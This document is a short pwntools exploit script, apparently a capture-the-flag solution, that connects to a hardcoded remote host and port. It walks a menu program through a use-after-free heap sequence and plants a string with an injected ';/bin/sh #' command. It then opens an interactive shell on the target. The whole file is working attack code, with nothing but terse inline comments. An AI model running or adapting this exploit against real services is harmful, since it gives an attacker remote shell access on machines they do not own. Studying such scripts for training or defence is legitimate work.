from pwn import *

p = remote("111.198.29.45" , 30899)

p.send("1" + "\n") 
p.sendline("a"*12)  # malloc 12
p.send("3" + "\n")  
p.sendline("a" * 12) # malloc 12
p.send("5" + "\n") 
p.sendline("N") # uaf  
p.send("3" + "\n") 
p.sendline("a" * 12) # malloc 12
p.send("3" + "\n") 
p.sendline("\'"+";/bin/sh #"+"\\") # malloc 12 
p.send("4" + "\n") 
p.recv()	
p.interactive()